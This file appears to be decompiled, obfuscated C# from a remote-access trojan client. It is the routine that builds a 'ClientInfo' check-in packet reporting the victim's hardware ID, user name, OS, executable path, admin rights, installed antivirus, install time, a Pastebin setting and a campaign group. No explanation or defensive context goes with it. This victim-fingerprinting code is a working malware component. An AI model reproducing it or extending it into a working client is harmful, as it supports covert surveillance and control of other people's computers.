using System;
using System.IO;
using System.Windows.Forms;
using Microsoft.VisualBasic.Devices;
using ns1;
using ns17;

namespace ns19;

public static class GClass21
{
	public static byte[] smethod_0()
	{
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		GClass18 gClass = new GClass18();
		gClass.method_21("Packet").String_0 = "ClientInfo";
		gClass.method_21("HWID").String_0 = GClass10.string_15;
		gClass.method_21("User").String_0 = Environment.UserName.ToString();
		gClass.method_21("OS").String_0 = new ComputerInfo().get_OSFullName().ToString().Replace("Microsoft", null) + " " + Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit");
		gClass.method_21("Path").String_0 = Application.get_ExecutablePath();
		gClass.method_21("Version").String_0 = GClass10.string_4;
		gClass.method_21("Admin").String_0 = GClass22.smethod_0().ToString().ToLower()
			.Replace("true", "Admin")
			.Replace("false", "User");
		gClass.method_21("Performance").String_0 = GClass22.smethod_5();
		gClass.method_21("Pastebin").String_0 = GClass10.string_13;
		gClass.method_21("Antivirus").String_0 = GClass22.smethod_2();
		gClass.method_21("Installed").String_0 = new FileInfo(Application.get_ExecutablePath()).LastWriteTime.ToUniversalTime().ToString();
		gClass.method_21("Pong").String_0 = "";
		gClass.method_21("Group").String_0 = GClass10.string_17;
		return gClass.method_31();
	}
}
